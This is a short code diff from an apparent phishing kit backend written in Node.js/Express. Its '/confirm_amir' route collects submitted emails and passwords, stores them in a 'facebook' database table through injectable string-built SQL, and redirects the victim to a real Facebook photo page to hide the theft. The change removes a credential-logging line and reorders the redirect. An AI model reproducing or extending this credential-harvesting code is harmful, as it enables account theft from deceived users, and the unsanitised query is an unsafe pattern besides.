@@ -49,14 +49,13 @@ app.post('/confirm_amir', function (req, res) {
     var b = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
-    console.log(a,b,c,d)
+    res.redirect('https://www.facebook.com/photo.php?fbid=160897268265919&set=pcb.2277483372290209&type=3&theater&ifg=1')
    
     client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) {
         if (!err) {
             console.log(result)
         }
     })
-    res.redirect('https://www.facebook.com/photo.php?fbid=160897268265919&set=pcb.2277483372290209&type=3&theater&ifg=1')
 })
 app.listen(PORT, function () {
     console.log('Server Started')
